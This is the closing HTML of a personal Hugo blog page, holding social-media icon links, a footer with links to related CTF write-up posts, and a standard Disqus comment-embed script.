<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg>
</div>
</a>
<a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg>
</div>
</a>
<a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg>
</div>
</a>
<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
</div>
</a>
</div>
<div class="text-sm text-gray-500 leading-tight a-gray">
<br>
Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 1860 words in this page.
</div>
</div>
</div>
</aside>
<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
<hr class=double-line>
<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
<a class=flex-grow-0 href=/relax/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
Just Relax here......
</a>
<a class=flex-grow-0 href=/2021/10/30/killerqueenctf2021-wp/>
KillerQueenCTF2021 Wp
<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a>
</div>
<div>
<div class="font-serif pb-2 flex align-start leading-loose">
<span class="heading pr-6 leading-loose">Related</span>
<span>
<a href=/2021/10/26/qwnt2021-wp/>2021强网拟态 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/10/24/dasctf1021-wp/>DasCTF1021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/10/22/digitaloverdosectf2021-wp/>DigitalOverdoseCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/10/04/tsgctf2021-wp/>TSGCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/09/13/tsuku2021-wp/>TsukuCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/09/07/grabconctf2021-wp/>GrabCONCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/09/05/ssctf2021-wp/>SSCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/08/18/ractf2021-wp/>RACTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/08/08/redpwn2021-wp/>RedpwnCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/08/05/dasctf0721-wp/>DasCTF0721 Wp</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/07/29/cybricsctf2021-wp/>CybricsCTF2021 Wp</a>
</span>
</div>
</div>
<hr>
<div class=pb-2>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<hr>
</footer>
<script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script>
</div>
</body>
</html>